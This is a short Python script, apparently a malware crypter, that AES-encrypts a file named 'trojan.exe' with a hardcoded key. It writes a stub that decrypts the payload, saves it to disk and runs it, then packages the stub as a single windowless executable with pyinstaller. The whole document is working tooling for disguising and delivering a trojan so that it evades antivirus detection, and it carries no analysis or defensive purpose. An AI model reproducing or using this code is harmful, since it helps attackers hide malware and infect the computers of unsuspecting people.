import subprocess
import pyaes
import os

KEY = b"1234567891234567"
FILE_NAME = "trojan.exe"
STUB_NAME = "stub.py"
MALWARE_NAME = "encrypted_trojan.exe"
with open(FILE_NAME, "rb") as file:
    exec = file.read()

encrypted = pyaes.AESModeOfOperationCTR(KEY).encrypt(exec)

stub = f"""
import pyaes
import subprocess
MALWARE_NAME = "{MALWARE_NAME}"
KEY = {KEY}
encrypted = {encrypted}
decrypter = pyaes.AESModeOfOperationCTR(KEY).decrypt(encrypted)
with open(MALWARE_NAME, "wb") as file:
    file.write(decrypter)
subprocess.Popen(MALWARE_NAME)
        """

with open(STUB_NAME, "w") as file:
    file.write(stub)

os.system("pyinstaller -F -w --clean {}".format(STUB_NAME))


